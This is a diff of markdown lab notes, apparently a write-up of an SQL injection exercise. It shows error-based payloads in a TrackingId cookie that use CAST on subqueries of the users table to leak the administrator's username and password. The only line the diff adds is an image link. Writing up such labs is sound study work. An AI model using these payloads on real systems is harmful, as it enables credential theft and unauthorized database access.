@@ -162,4 +162,5 @@
 - Let's jump the gun and go ahead and call `TrackingId='AND 1=CAST((SELECT password from users) AS int)--;` which results in an error of ERROR: more than one row returned by a subquery used as an expression. We need to specify administrator as the user and limit the results; however, we can't add on another WHERE statement to specify where username equals administrator. We do note 'administrator' is the first entry when we run `TrackingId='AND 1=CAST((SELECT username from users LIMIT 1) AS int)--;`.
 - `'AND 1=CAST((SELECT password from users LIMIT 1) AS int)--`
 
+![image](https://github.com/user-attachments/assets/2493d1f9-73d7-4f18-b067-51e3abe24db6)
 
